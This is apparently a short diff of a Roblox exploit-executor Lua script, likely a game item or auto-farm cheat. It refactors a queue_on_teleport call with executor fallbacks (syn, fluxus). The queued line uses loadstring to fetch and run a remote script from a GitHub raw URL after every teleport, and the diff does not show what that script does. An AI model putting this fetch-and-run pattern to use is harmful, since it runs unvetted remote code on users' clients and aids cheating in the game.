@@ -1,4 +1,3 @@
-pcall(function() getgenv().LOADEDGAG2 = true end)
 if not game:IsLoaded() then game.Loaded:Wait() end
 
 
@@ -13,8 +12,8 @@ function missing(t, f, fallback)
 	return fallback
 end
 
-
-queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/nitrolden-dot/blacklist/refs/heads/main/lo.luau'))()")
+queueteleport =  missing("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))
+queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/nitrolden-dot/blacklist/refs/heads/main/lo.luau'))()")
 
 local Filter = {
     "Legendary",
@@ -130,7 +129,7 @@ end
 
 local TeleportCheck = false
 Players.LocalPlayer.OnTeleport:Connect(function(State)
-    if (not TeleportCheck) then
+    if (not TeleportCheck) and queueteleport then
         TeleportCheck = true
     end
 end)
